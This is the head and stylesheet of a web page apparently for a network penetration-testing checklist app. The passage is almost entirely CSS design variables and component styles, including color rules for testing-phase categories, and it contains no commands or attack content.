<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Penetration Testing Framework</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;family=Outfit:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /**
         * NetPenTest Checklist - Premium Design System
         * Version: 2.0
         */

        /* ====== CORE VARIABLES ====== */
        :root {
            /* Brand color palette */
            --brand-prussian: #0b2545;
            --brand-indigo: #13315c;
            --brand-yale: #134074;
            --brand-cyan: #0091ad;
            --brand-aqua: #00b4d8;
            --brand-sky: #48cae4;
            --brand-teal: #00a896;
            --brand-mint: #ade8f4;

            /* Extended color palette */
            --extended-navy: #051937;
            --extended-midnight: #004d7a;
            --extended-cobalt: #008793;
            --extended-teal: #00bf72;
            --extended-lime: #a8eb12;
            
            /* Gradients */
            --gradient-primary: linear-gradient(120deg, var(--brand-yale) 0%, var(--brand-indigo) 100%);
            --gradient-secondary: linear-gradient(120deg, var(--brand-teal) 0%, var(--brand-cyan) 100%);
            --gradient-accent: linear-gradient(120deg, var(--extended-teal) 0%, var(--extended-lime) 100%);
            --gradient-dark: linear-gradient(120deg, var(--extended-navy) 0%, var(--brand-prussian) 100%);
            --gradient-highlight: linear-gradient(120deg, var(--brand-sky) 0%, var(--brand-aqua) 100%);
            --gradient-critical: linear-gradient(120deg, #9a031e 0%, #e63946 100%);
            --gradient-high: linear-gradient(120deg, #e76f51 0%, #f4a261 100%);
            --gradient-medium: linear-gradient(120deg, #e9c46a 0%, #f1faee 100%);
            --gradient-low: linear-gradient(120deg, #2a9d8f 0%, #8eecc9 100%);

            /* Neutral color system */
            --neutral-900: #0f172a;
            --neutral-800: #1e293b;
            --neutral-700: #334155;
            --neutral-600: #475569;
            --neutral-500: #64748b;
            --neutral-400: #94a3b8;
            --neutral-300: #cbd5e1;
            --neutral-200: #e2e8f0;
            --neutral-100: #f1f5f9;
            --neutral-50: #f8fafc;
            --neutral-0: #ffffff;

            /* Status colors */
            --status-critical: #e63946;
            --status-critical-hover: #c1121f;
            --status-critical-bg: rgba(230, 57, 70, 0.15);
            --status-critical-border: rgba(230, 57, 70, 0.5);

            --status-high: #f4a261;
            --status-high-hover: #e76f51;
            --status-high-bg: rgba(244, 162, 97, 0.15);
            --status-high-border: rgba(244, 162, 97, 0.5);

            --status-medium: #e9c46a;
            --status-medium-hover: #f3b61f;
            --status-medium-bg: rgba(233, 196, 106, 0.15);
            --status-medium-border: rgba(233, 196, 106, 0.5);

            --status-low: #2a9d8f;
            --status-low-hover: #1f776c;
            --status-low-bg: rgba(42, 157, 143, 0.15);
            --status-low-border: rgba(42, 157, 143, 0.5);

            --status-info: #48cae4;
            --status-info-hover: #00b4d8;
            --status-info-bg: rgba(72, 202, 228, 0.15);
            --status-info-border: rgba(72, 202, 228, 0.5);

            --status-success: #57cc99;
            --status-success-hover: #38a3a5;
            --status-success-bg: rgba(87, 204, 153, 0.15);
            --status-success-border: rgba(87, 204, 153, 0.5);

            /* Shadows system */
            --shadow-xs: 0 1px 2px rgba(15, 23, 42, 0.05);
            --shadow-sm: 0 2px 4px rgba(15, 23, 42, 0.05), 0 1px 2px rgba(15, 23, 42, 0.1);
            --shadow-md: 0 4px 6px -1px rgba(15, 23, 42, 0.1), 0 2px 4px -2px rgba(15, 23, 42, 0.1);
            --shadow-lg: 0 10px 15px -3px rgba(15, 23, 42, 0.1), 0 4px 6px -4px rgba(15, 23, 42, 0.1);
            --shadow-xl: 0 20px 25px -5px rgba(15, 23, 42, 0.1), 0 8px 10px -6px rgba(15, 23, 42, 0.1);
            --shadow-2xl: 0 25px 50px -12px rgba(15, 23, 42, 0.25);
            --shadow-inner: inset 0 2px 4px 0 rgba(15, 23, 42, 0.05);
            
            /* 3D Shadow variants */
            --shadow-top-accent: 0 -4px 0 0 var(--brand-aqua);
            --shadow-left-accent: inset 4px 0 0 0 var(--brand-teal);
            --shadow-critical: inset 4px 0 0 0 var(--status-critical);
            --shadow-high: inset 4px 0 0 0 var(--status-high);
            --shadow-medium: inset 4px 0 0 0 var(--status-medium);
            --shadow-low: inset 4px 0 0 0 var(--status-low);
            
            /* Glass effects */
            --glass-white: rgba(255, 255, 255, 0.7);
            --glass-black: rgba(15, 23, 42, 0.7);
            --glass-blur: blur(16px);
            --glass-saturate: saturate(180%);
            
            /* Typography */
            --font-heading: 'Outfit', sans-serif;
            --font-body: 'Inter', system-ui, sans-serif;
            
            /* Border radiuses */
            --radius-none: 0;
            --radius-xs: 0.125rem;
            --radius-sm: 0.25rem;
            --radius-md: 0.375rem;
            --radius-lg: 0.5rem;
            --radius-xl: 0.75rem;
            --radius-2xl: 1rem;
            --radius-3xl: 1.5rem;
            --radius-full: 9999px;

            /* Spacing system */
            --space-0: 0;
            --space-px: 1px;
            --space-0-5: 0.125rem;
            --space-1: 0.25rem;
            --space-1-5: 0.375rem;
            --space-2: 0.5rem;
            --space-2-5: 0.625rem;
            --space-3: 0.75rem;
            --space-3-5: 0.875rem;
            --space-4: 1rem;
            --space-5: 1.25rem;
            --space-6: 1.5rem;
            --space-7: 1.75rem;
            --space-8: 2rem;
            --space-9: 2.25rem;
            --space-10: 2.5rem;
            --space-11: 2.75rem;
            --space-12: 3rem;
            --space-14: 3.5rem;
            --space-16: 4rem;
            --space-20: 5rem;
            --space-24: 6rem;
            --space-28: 7rem;
            --space-32: 8rem;
            --space-36: 9rem;
            --space-40: 10rem;
            --space-44: 11rem;
            --space-48: 12rem;
            --space-52: 13rem;
            --space-56: 14rem;
            --space-60: 15rem;
            --space-64: 16rem;
            --space-72: 18rem;
            --space-80: 20rem;
            --space-96: 24rem;
            
            /* Z-index layers */
            --z-negative: -1;
            --z-elevate: 1;
            --z-dropdown: 1000;
            --z-sticky: 1020;
            --z-fixed: 1030;
            --z-modal-backdrop: 1040;
            --z-modal: 1050;
            --z-popover: 1060;
            --z-tooltip: 1070;
            
            /* Animation timing */
            --transition-fast: 150ms;
            --transition-normal: 250ms;
            --transition-slow: 350ms;
            --transition-very-slow: 500ms;
            --ease-bounce: cubic-bezier(0.34, 1.56, 0.64, 1);
            --ease-out: cubic-bezier(0, 0, 0.2, 1);
            --ease-in: cubic-bezier(0.4, 0, 1, 1);
            --ease-in-out: cubic-bezier(0.4, 0, 0.2, 1);
            
            /* Interactive effects */
            --hover-lift: translateY(-4px);
            --hover-lift-lg: translateY(-8px);
            --hover-lift-sm: translateY(-2px);
            --active-press: translateY(2px);
            --active-press-sm: translateY(1px);
            
            /* Card & component properties */
            --card-border-width: 1px;
            --header-height: 4.5rem;
        }

        /* ====== CSS RESET ====== */
        *, *::before, *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html {
            font-size: 16px;
            scroll-behavior: smooth;
            scrollbar-width: thin;
            scrollbar-color: var(--neutral-400) var(--neutral-100);
        }

        body {
            font-family: var(--font-body);
            font-size: 1rem;
            line-height: 1.6;
            color: var(--neutral-700);
            background-color: var(--neutral-50);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            overflow-x: hidden;
        }

        h1, h2, h3, h4, h5, h6 {
            font-family: var(--font-heading);
            color: var(--neutral-900);
            font-weight: 600;
            line-height: 1.3;
            letter-spacing: -0.01em;
        }

        h1 {
            font-size: 2.25rem;
            letter-spacing: -0.02em;
        }

        h2 {
            font-size: 1.875rem;
            letter-spacing: -0.015em;
        }

        h3 {
            font-size: 1.5rem;
        }

        h4 {
            font-size: 1.25rem;
        }

        h5 {
            font-size: 1.125rem;
        }

        h6 {
            font-size: 1rem;
        }

        img, picture, video, canvas, svg {
            display: block;
            max-width: 100%;
        }

        input, button, textarea, select {
            font: inherit;
        }

        ol, ul {
            list-style: none;
        }

        a {
            color: var(--brand-yale);
            text-decoration: none;
            transition: color var(--transition-normal) var(--ease-in-out);
        }

        a:hover {
            color: var(--brand-cyan);
        }

        /* ====== SCROLLBAR STYLING ====== */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--neutral-100);
            border-radius: var(--radius-full);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--neutral-400);
            border-radius: var(--radius-full);
            transition: background var(--transition-normal) var(--ease-in-out);
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--neutral-500);
        }

        /* ====== UTILITIES ====== */
        .container {
            width: 100%;
            max-width: 1440px;
            margin: 0 auto;
            padding: 0 var(--space-4);
        }

        @media (min-width: 640px) {
            .container {
                padding: 0 var(--space-6);
            }
        }

        @media (min-width: 1024px) {
            .container {
                padding: 0 var(--space-8);
            }
        }

        .section {
            margin-bottom: var(--space-12);
        }

        .visually-hidden {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }

        .text-center {
            text-align: center;
        }

        .text-right {
            text-align: right;
        }

        /* ====== BASE LAYOUT ====== */
        main {
            flex: 1;
            padding-top: var(--space-6);
            padding-bottom: var(--space-24);
        }

        /* ====== TYPOGRAPHY HELPERS ====== */
        .text-xs {
            font-size: 0.75rem;
            line-height: 1rem;
        }

        .text-sm {
            font-size: 0.875rem;
            line-height: 1.25rem;
        }

        .text-base {
            font-size: 1rem;
            line-height: 1.5rem;
        }

        .text-lg {
            font-size: 1.125rem;
            line-height: 1.75rem;
        }

        .text-xl {
            font-size: 1.25rem;
            line-height: 1.75rem;
        }

        .text-2xl {
            font-size: 1.5rem;
            line-height: 2rem;
        }

        .text-3xl {
            font-size: 1.875rem;
            line-height: 2.25rem;
        }

        .font-light {
            font-weight: 300;
        }

        .font-normal {
            font-weight: 400;
        }

        .font-medium {
            font-weight: 500;
        }

        .font-semibold {
            font-weight: 600;
        }

        .font-bold {
            font-weight: 700;
        }

        .text-gradient {
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
        }

        .text-gradient-primary {
            background-image: var(--gradient-primary);
        }

        .text-gradient-secondary {
            background-image: var(--gradient-secondary);
        }

        /* ====== HEADER STYLES ====== */
        .app-header {
            background-image: var(--gradient-primary);
            color: var(--neutral-0);
            position: sticky;
            top: 0;
            z-index: var(--z-sticky);
            box-shadow: var(--shadow-lg);
            height: var(--header-height);
            display: flex;
            align-items: center;
        }

        .app-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.05' fill-rule='evenodd'/%3E%3C/svg%3E");
            opacity: 0.1;
            pointer-events: none;
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            position: relative;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: var(--space-4);
        }

        .logo-icon {
            width: 3.5rem;
            height: 3.5rem;
            background-color: rgba(255, 255, 255, 0.15);
            border-radius: var(--radius-xl);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }

        .logo-icon::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0) 60%);
        }

        .logo-icon i {
            font-size: 1.8rem;
            color: var(--neutral-0);
            position: relative;
            z-index: 1;
        }

        .logo-text h1 {
            color: var(--neutral-0);
            font-size: 1.5rem;
            margin: 0;
            font-weight: 700;
            letter-spacing: -0.02em;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
            line-height: 1.2;
        }

        .logo-text span {
            display: block;
            font-size: 0.875rem;
            opacity: 0.85;
            font-weight: 400;
            letter-spacing: 0.01em;
        }

        .header-actions {
            display: flex;
            gap: var(--space-3);
        }

        /* ====== BUTTON SYSTEM ====== */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 0.625rem 1.25rem;
            border-radius: var(--radius-md);
            font-weight: 500;
            font-size: 0.9375rem;
            line-height: 1.5;
            white-space: nowrap;
            transition: all var(--transition-normal) var(--ease-out);
            cursor: pointer;
            position: relative;
            overflow: hidden;
            border: none;
            outline: none;
            user-select: none;
            text-align: center;
            vertical-align: middle;
            gap: var(--space-2);
            box-shadow: var(--shadow-sm);
            z-index: 1;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: transparent;
            transform: translateY(50%) scale(0);
            border-radius: 50%;
            z-index: -1;
            transition: transform var(--transition-normal) var(--ease-out);
        }

        .btn:hover::before {
            transform: translateY(0) scale(2.5);
        }

        .btn:active {
            transform: var(--active-press-sm);
        }

        .btn i {
            font-size: 1rem;
        }

        .btn-sm {
            padding: 0.5rem 1rem;
            font-size: 0.8125rem;
            border-radius: var(--radius-md);
        }

        .btn-lg {
            padding: 0.75rem 1.5rem;
            font-size: 1rem;
            border-radius: var(--radius-lg);
        }

        .btn-icon-only {
            width: 2.5rem;
            height: 2.5rem;
            padding: 0;
            border-radius: var(--radius-md);
        }

        .btn-icon-only.btn-sm {
            width: 2rem;
            height: 2rem;
        }

        .btn-icon-only.btn-lg {
            width: 3rem;
            height: 3rem;
            border-radius: var(--radius-lg);
        }

        .btn-primary {
            background-color: var(--brand-cyan);
            color: var(--neutral-0);
        }

        .btn-primary::before {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .btn-primary:hover {
            background-color: var(--brand-aqua);
            color: var(--neutral-0);
            box-shadow: var(--shadow-md);
        }

        .btn-secondary {
            background-color: var(--brand-teal);
            color: var(--neutral-0);
        }

        .btn-secondary::before {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .btn-secondary:hover {
            background-color: var(--extended-teal);
            color: var(--neutral-0);
            box-shadow: var(--shadow-md);
        }

        .btn-success {
            background-color: var(--status-success);
            color: var(--neutral-0);
        }

        .btn-success::before {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .btn-success:hover {
            background-color: var(--status-success-hover);
            color: var(--neutral-0);
            box-shadow: var(--shadow-md);
        }

        .btn-danger {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        .btn-danger::before {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .btn-danger:hover {
            background-color: var(--status-critical-hover);
            color: var(--neutral-0);
            box-shadow: var(--shadow-md);
        }

        .btn-outline {
            background-color: transparent;
            color: var(--neutral-0);
            border: 1px solid rgba(255, 255, 255, 0.3);
            backdrop-filter: var(--glass-blur);
            -webkit-backdrop-filter: var(--glass-blur);
        }

        .btn-outline::before {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .btn-outline:hover {
            border-color: rgba(255, 255, 255, 0.5);
            color: var(--neutral-0);
            box-shadow: var(--shadow-md);
        }

        /* ====== PROJECT INFO SECTION ====== */
        .project-info {
            background-color: var(--neutral-0);
            border-radius: var(--radius-2xl);
            padding: var(--space-8);
            margin-top: var(--space-8);
            box-shadow: var(--shadow-xl);
            border: var(--card-border-width) solid rgba(0, 0, 0, 0.04);
            position: relative;
            overflow: hidden;
            transition: all var(--transition-normal) var(--ease-out);
        }

        .project-info::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 6px;
            background-image: var(--gradient-primary);
        }

        .project-info-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--space-6);
            padding-bottom: var(--space-4);
            border-bottom: 1px solid var(--neutral-200);
        }

        .project-info-header h2 {
            margin: 0;
            font-size: 1.75rem;
            background-image: var(--gradient-primary);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            position: relative;
        }

        .project-details {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: var(--space-6);
        }

        .project-detail-item {
            position: relative;
        }

        .project-detail-item dt {
            font-size: 0.8125rem;
            font-weight: 600;
            color: var(--neutral-500);
            margin-bottom: var(--space-2);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            display: flex;
            align-items: center;
            gap: var(--space-2);
        }

        .project-detail-item dt i {
            color: var(--brand-cyan);
            font-size: 0.9375rem;
        }

        .project-detail-item dd {
            font-weight: 500;
            color: var(--neutral-900);
            font-size: 1.0625rem;
            line-height: 1.4;
        }

        /* ====== PROGRESS SECTION ====== */
        .progress-section {
            margin: var(--space-12) 0;
        }

        .section-header {
            display: flex;
            align-items: flex-end;
            justify-content: space-between;
            margin-bottom: var(--space-6);
            position: relative;
        }

        .section-title {
            font-size: 1.75rem;
            margin: 0;
            position: relative;
            padding-bottom: var(--space-3);
            display: inline-block;
        }

        .section-title::after {
            content: "";
            position: absolute;
            bottom: 0;
            left: 0;
            height: 4px;
            width: 3.5rem;
            background-image: var(--gradient-primary);
            border-radius: var(--radius-full);
        }

        .progress-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: var(--space-6);
        }

        .progress-card {
            background-color: var(--neutral-0);
            border-radius: var(--radius-xl);
            padding: var(--space-6);
            box-shadow: var(--shadow-lg);
            border: var(--card-border-width) solid rgba(0, 0, 0, 0.04);
            transition: all var(--transition-normal) var(--ease-bounce);
            position: relative;
            overflow: hidden;
            z-index: 1;
            transform-origin: center bottom;
        }

        .progress-card:hover {
            transform: var(--hover-lift);
            box-shadow: var(--shadow-2xl);
        }

        .progress-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 6px;
            height: 100%;
        }

        .progress-overall::before {
            background-image: var(--gradient-primary);
        }

        .progress-critical::before {
            background-image: var(--gradient-critical);
        }

        .progress-high::before {
            background-image: var(--gradient-high);
        }

        .progress-medium::before {
            background-image: var(--gradient-medium);
        }

        .progress-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--space-4);
        }

        .progress-card-title {
            font-size: 1.125rem;
            font-weight: 600;
            margin: 0;
            display: flex;
            align-items: center;
            gap: var(--space-3);
            color: var(--neutral-800);
        }

        .progress-card-title i {
            width: 2.25rem;
            height: 2.25rem;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-lg);
            font-size: 1.0625rem;
            box-shadow: var(--shadow-sm);
        }

        .progress-overall .progress-card-title i {
            background-color: var(--brand-yale);
            color: var(--neutral-0);
        }

        .progress-critical .progress-card-title i {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        .progress-high .progress-card-title i {
            background-color: var(--status-high);
            color: var(--neutral-0);
        }

        .progress-medium .progress-card-title i {
            background-color: var(--status-medium);
            color: var(--neutral-900);
        }

        .progress-percentage {
            font-weight: 700;
            font-size: 1.25rem;
            font-family: var(--font-heading);
            min-width: 3.5rem;
            text-align: right;
            position: relative;
        }

        .progress-overall .progress-percentage {
            color: var(--brand-yale);
        }

        .progress-critical .progress-percentage {
            color: var(--status-critical);
        }

        .progress-high .progress-percentage {
            color: var(--status-high);
        }

        .progress-medium .progress-percentage {
            color: var(--status-medium);
        }

        .progress-percentage::after {
            content: '';
            position: absolute;
            bottom: -0.25rem;
            left: 0;
            width: 100%;
            height: 3px;
            border-radius: var(--radius-full);
            opacity: 0.25;
        }

        .progress-overall .progress-percentage::after {
            background-color: var(--brand-yale);
        }

        .progress-critical .progress-percentage::after {
            background-color: var(--status-critical);
        }

        .progress-high .progress-percentage::after {
            background-color: var(--status-high);
        }

        .progress-medium .progress-percentage::after {
            background-color: var(--status-medium);
        }

        .progress-bar {
            height: 0.7rem;
            background-color: var(--neutral-100);
            border-radius: var(--radius-full);
            overflow: hidden;
            margin-bottom: var(--space-3);
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .progress-value {
            height: 100%;
            border-radius: var(--radius-full);
            transition: width 1.2s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
        }

        .progress-value::after {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background-image: linear-gradient(90deg, 
                rgba(255, 255, 255, 0.1) 0%, 
                rgba(255, 255, 255, 0.2) 20%, 
                rgba(255, 255, 255, 0.1) 40%
            );
            background-size: 200% 100%;
            animation: shimmer 2s infinite;
        }

        @keyframes shimmer {
            0% { background-position: 100% 0; }
            100% { background-position: -100% 0; }
        }

        .progress-overall .progress-value {
            background-image: var(--gradient-primary);
        }

        .progress-critical .progress-value {
            background-image: var(--gradient-critical);
        }

        .progress-high .progress-value {
            background-image: var(--gradient-high);
        }

        .progress-medium .progress-value {
            background-image: var(--gradient-medium);
        }

        .progress-details {
            display: flex;
            justify-content: space-between;
            font-size: 0.8125rem;
            color: var(--neutral-500);
            font-weight: 500;
        }

        /* ====== CATEGORIES SECTION ====== */
        .categories-section {
            margin-bottom: var(--space-12);
        }

        .categories-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: var(--space-6);
        }

        .category-card {
            background-color: var(--neutral-0);
            border-radius: var(--radius-xl);
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            transition: all var(--transition-normal) var(--ease-bounce);
            cursor: pointer;
            border: var(--card-border-width) solid rgba(0, 0, 0, 0.04);
            position: relative;
            display: flex;
            flex-direction: column;
            transform-origin: center bottom;
        }

        .category-card:hover {
            transform: var(--hover-lift);
            box-shadow: var(--shadow-2xl);
        }

        .category-card::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%) scale(0);
            width: 95%;
            height: 6px;
            background-image: var(--gradient-primary);
            border-radius: var(--radius-full);
            transition: transform var(--transition-normal) var(--ease-bounce);
            z-index: 1;
        }

        .category-card:hover::after {
            transform: translateX(-50%) scale(1);
        }

        .category-priority {
            display: inline-flex;
            align-items: center;
            gap: var(--space-2);
            position: absolute;
            top: var(--space-4);
            right: var(--space-4);
            padding: var(--space-2) var(--space-3);
            border-radius: var(--radius-full);
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            z-index: 1;
            box-shadow: var(--shadow-md);
            border: 1px solid;
        }

        .priority-critical {
            background-color: var(--status-critical-bg);
            color: var(--status-critical);
            border-color: var(--status-critical-border);
        }

        .priority-high {
            background-color: var(--status-high-bg);
            color: var(--status-high);
            border-color: var(--status-high-border);
        }

        .priority-medium {
            background-color: var(--status-medium-bg);
            color: var(--status-medium);
            border-color: var(--status-medium-border);
        }

        .priority-low {
            background-color: var(--status-low-bg);
            color: var(--status-low);
            border-color: var(--status-low-border);
        }

        .category-content {
            padding: var(--space-6);
            display: flex;
            flex-direction: column;
            flex-grow: 1;
        }

        .category-header {
            display: flex;
            margin-bottom: var(--space-4);
        }

        .category-icon {
            width: 3.5rem;
            height: 3.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-lg);
            margin-right: var(--space-4);
            font-size: 1.5rem;
            flex-shrink: 0;
            box-shadow: var(--shadow-lg);
            position: relative;
            overflow: hidden;
        }

        .category-icon::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0) 60%);
        }

        .category-icon i {
            position: relative;
            z-index: 1;
        }

        .category-header-content {
            display: flex;
            flex-direction: column;
        }

        .category-title {
            font-size: 1.25rem;
            margin: 0;
            font-weight: 600;
            line-height: 1.4;
            margin-bottom: var(--space-1);
            color: var(--neutral-900);
            position: relative;
            display: inline-block;
        }

        .category-description {
            font-size: 0.9375rem;
            color: var(--neutral-600);
            margin-bottom: var(--space-4);
            height: 3em;
            overflow: hidden;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            line-height: 1.5;
        }

        .category-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.875rem;
            padding-top: var(--space-4);
            margin-top: auto;
            border-top: 1px solid var(--neutral-200);
        }

        .category-progress {
            color: var(--neutral-700);
            font-weight: 500;
            background-color: var(--neutral-100);
            padding: var(--space-1) var(--space-3);
            border-radius: var(--radius-full);
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
        }

        .view-tests {
            color: var(--brand-yale);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: var(--space-2);
            padding: var(--space-2) var(--space-3);
            border-radius: var(--radius-md);
            transition: all var(--transition-normal) var(--ease-out);
        }

        .view-tests:hover {
            background-color: var(--status-info-bg);
            color: var(--brand-cyan);
        }

        .view-tests i {
            font-size: 0.8125rem;
            transition: transform var(--transition-normal) var(--ease-bounce);
        }

        .category-card:hover .view-tests i {
            transform: translateX(4px);
        }

        /* Category color customizations */
        [data-category="reconnaissance"] .category-icon {
            background-color: var(--status-info);
            color: var(--neutral-0);
        }

        [data-category="network-scanning"] .category-icon {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        [data-category="vulnerability-assessment"] .category-icon {
            background-color: var(--status-high);
            color: var(--neutral-0);
        }

        [data-category="exploitation"] .category-icon {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        [data-category="post-exploitation"] .category-icon {
            background-color: var(--status-high);
            color: var(--neutral-0);
        }

        [data-category="wireless"] .category-icon {
            background-color: var(--status-high);
            color: var(--neutral-0);
        }

        [data-category="infrastructure"] .category-icon {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        [data-category="active-directory"] .category-icon {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        [data-category="industrial-control"] .category-icon {
            background-color: var(--status-critical);
            color: var(--neutral-0);
        }

        [data-category="cloud-network"] .category-icon {
            background-color: var(--status-high);
            color: var(--neutral-0);
        }

        [data-category="container-networks"] .category-icon {
            background-color: var(--status-high);
            color: var(--neutral-0);
        }

        [data-category="protocol-analysis"] .category-icon {
            background-color: var(--status-medium);
            color: var(--neutral-900);
        }

        /* ====== CATEGORY DETAILS SECTION ====== */
        .category-details {
            background-color: var(--neutral-0);
            border-radius: var(--radius-xl);
            overflow: hidden;
            box-shadow: var(--shadow-xl);
            margin-bottom: var(--space-8);
            border: var(--card-border-width) solid rgba(0, 0, 0, 0.04);
            animation: fadeScale var(--transition-slow) var(--ease-bounce);
        }

        @keyframes fadeScale {
            0% { 
                opacity: 0; 
                transform: scale(0.97);
            }
            100% { 
                opacity: 1; 
                transform: scale(1);
            }
        }

        .details-header {
            background-image: var(--gradient-primary);
            padding: var(--space-8);
            color: var(--neutral-0);
            position: relative;
            overflow: hidden;
        }

        .details-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
